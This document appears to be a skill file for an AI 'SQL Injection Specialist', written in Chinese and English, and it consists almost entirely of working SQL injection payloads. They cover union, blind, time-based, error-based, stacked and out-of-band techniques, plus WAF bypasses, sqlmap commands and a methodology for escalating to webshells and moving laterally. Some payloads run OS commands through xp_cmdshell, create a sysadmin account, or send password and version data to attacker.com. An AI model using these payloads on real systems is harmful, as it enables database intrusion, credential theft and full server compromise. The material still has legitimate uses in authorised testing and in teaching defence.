# SQL Injection Specialist

## 核心能力

SQLi 全谱：Union/Boolean/Time/Error/Stacked/OOB — MySQL/PostgreSQL/MSSQL/Oracle/SQLite。

## 注入分类和Payload

### Union-Based
```
# 列数探测
' ORDER BY 1-- / ' ORDER BY 2-- / ... (二分加速)
' UNION SELECT NULL-- (逐列加NULL直到不报错)

# 数据提取
' UNION SELECT NULL,@@version,NULL-- (MySQL)
' UNION SELECT NULL,version(),NULL-- (PostgreSQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--
```

### Boolean-Based Blind
```
# AND真→正常  AND假→异常
' AND 1=1-- / ' AND 1=2--
' AND (SELECT LEN(password) FROM users WHERE id=1) > 0--
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)) > 96--
```

### Time-Based Blind
```
# MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--

# PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))) > 96 WAITFOR DELAY '0:0:5'--

# Oracle
' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)--
```

### Error-Based
```
# MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# PostgreSQL
' AND CAST((SELECT version()) AS INT)--
' AND (SELECT 1/(SELECT 0))--

# MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
'; DECLARE @x INT = 1; SELECT 1/(@x-1)--
```

### Stacked Queries
```
# 确认支持
'; SELECT 1--

# MSSQL — 最危险的平台
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
'; CREATE USER hacker WITH PASSWORD='P@ss123'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--
'; BACKUP DATABASE master TO DISK='\\attacker\share\master.bak'--

# PostgreSQL
'; CREATE TABLE pwn (cmd_output text); COPY pwn FROM PROGRAM 'id'--
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'--
```

### Out-of-Band (OOB)
```
# MSSQL (DNS exfil)
'; DECLARE @q VARCHAR(99); SET @q='\\'+(SELECT @@version)+'.attacker.com\a'; EXEC master..xp_dirtree @q--
'; EXEC master..xp_fileexist '\\attacker.com\share'--

# MySQL (Windows UNC path)
' AND LOAD_FILE('\\\\attacker.com\\share')--
' INTO OUTFILE '\\\\attacker.com\\share\\data.txt'--

# Oracle (UTL_HTTP)
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT password FROM users WHERE rownum=1)) FROM dual)--
```

### Bypass Techniques
```
# 空格绕过
'/**/AND/**/1=1--
'%0AAND%0A1=1--
'+AND+1=1--

# 关键字绕过
' AND 1 LIKE 1--           (替代 =)
' /*!50000AND*/ 1=1--       (MySQL 版本注释)
' AND 1 < 2--                (替代 = 用比较)
SeLeCt / UnIoN              (大小写混写)
' UNI/**/ON SELECT 1--       (内联注释截断)

# WAF特定绕过
' %00' UNION SELECT 1--      (空字节截断)
' \N UNION SELECT 1--        (MySQL null)
```

## 平台指纹

| DB | 指纹 |
|----|------|
| MySQL | `@@version`, `CONCAT()`, `#--`, `/*!*/` |
| PostgreSQL | `||`, `pg_sleep()`, `information_schema` 无 `table_name`单数 |
| MSSQL | `@@version`, `WAITFOR`, `xp_cmdshell`, `sysobjects` |
| Oracle | `FROM dual`, `ROWNUM`, `v$version`, `dbms_pipe` |
| SQLite | `sqlite_version()`, `sqlite_master`, 不支持注释 `--` |

## 工具链
- sqlmap: `sqlmap -u URL --batch --dbs --threads 10`
- sqlmap tamper脚本: `--tamper=space2comment,charencode,randomcase`
- Ghauri (现代替代): `ghauri -u URL --dbs`
- Burp + SQLiPy 插件

## 知识库
- `@communitytools/skills/injection` — SQLi / NoSQLi / LDAP / XPath 全谱

## 方法论
1. 确认注入点 → 单引号/双引号/反斜杠探测
2. 判断DB类型 → 版本函数指纹
3. 选注入策略 → Union > Error > Boolean > Time > OOB
4. 提权 → 读文件/写webshell/命令执行
5. 横向 → 跨库查询/链接服务器
